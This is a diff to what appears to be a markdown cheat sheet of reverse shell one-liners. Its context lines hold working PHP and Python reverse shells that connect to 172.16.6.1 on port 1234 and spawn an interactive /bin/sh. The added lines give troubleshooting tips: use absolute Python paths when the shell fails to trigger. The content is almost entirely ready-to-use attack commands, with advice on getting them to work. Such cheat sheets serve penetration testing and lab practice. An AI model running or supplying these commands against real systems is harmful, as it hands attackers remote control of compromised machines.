@@ -52,6 +52,14 @@ $sock=fsockopen("172.16.6.1", 1234);exec("/bin/sh -i <&3 >&3 2>&3");
 ```
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.16.6.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
+- Troubleshooting lessons
+````
+which python
+which python3
+/usr/bin/python
+/usr/bin/python3
+````
+- Try the absolute paths when `python3` or `python` are not working to trigger your reverse shell
 - Standard python reverse shell
 
 #### Ruby Reverse Shell
